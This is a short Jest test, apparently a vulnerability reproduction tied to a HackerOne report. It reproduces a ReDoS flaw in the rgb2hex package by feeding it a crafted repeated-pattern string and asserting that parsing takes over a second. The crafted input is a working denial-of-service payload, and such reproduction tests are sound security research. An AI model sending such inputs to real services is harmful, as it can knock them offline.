//https://hackerone.com/reports/319629
test("ReDos in rgb2hex", () => {
    const genstr = require("./utils").genstr;
    const measureTime = require("./utils").measureTime;
    const rgb2hex = require('rgb2hex');
  
    const color = 'rgb(' +  genstr(14,"0000,") + '000';
  
    let t = measureTime(function () {
        try
        {
            rgb2hex(color);
        }
        catch
        {
            
        }
        
    });
  
    let time = t[0] + t[1] / 1000000000;
  
    expect(time).toBeGreaterThan(1);
  });
